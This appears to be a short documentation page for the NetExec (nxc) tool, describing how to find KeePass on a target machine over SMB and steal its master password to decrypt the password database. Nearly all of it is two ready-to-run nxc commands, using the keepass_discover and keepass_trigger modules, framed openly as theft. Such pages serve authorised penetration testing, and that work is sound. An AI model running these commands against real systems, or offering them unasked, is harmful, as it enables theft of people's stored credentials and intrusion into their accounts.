title: Dump KeePass
html:
Dump KeePass

You can check if keepass is installed on the target computer and then steal the master password and decrypt the database !

nxc smb <ip> -u <USERNAME> -p <PASSWORD> -M keepass_discover
nxc smb <ip> -u <USERNAME> -p <PASSWORD> -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
excerpt: Dump KeePass You can check if keepass is installed on the target computer and then steal the master password and decrypt the database ! nxc smb <ip> -u <USERNAME> -p <PASSWORD> -M ke
